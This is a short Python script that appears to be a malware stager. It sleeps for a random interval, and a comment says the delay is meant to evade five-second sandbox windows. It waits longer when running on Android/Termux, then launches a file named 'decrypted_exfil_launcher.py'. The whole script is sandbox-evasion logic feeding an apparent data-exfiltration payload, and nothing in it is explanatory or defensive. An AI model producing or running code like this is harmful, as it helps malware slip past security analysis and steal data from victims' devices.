
#!/usr/bin/env python3
import time, random, os

def edr_delay():
    startup_noise = random.uniform(0.5, 1.5)
    execution_delay = random.uniform(7.0, 12.0)  # evade 5-second sandbox windows
    time.sleep(startup_noise)
    if "ANDROID_ROOT" in os.environ:  # Run only in Android/Termux
        time.sleep(execution_delay)

if __name__ == "__main__":
    edr_delay()
    os.system("python3 decrypted_exfil_launcher.py")
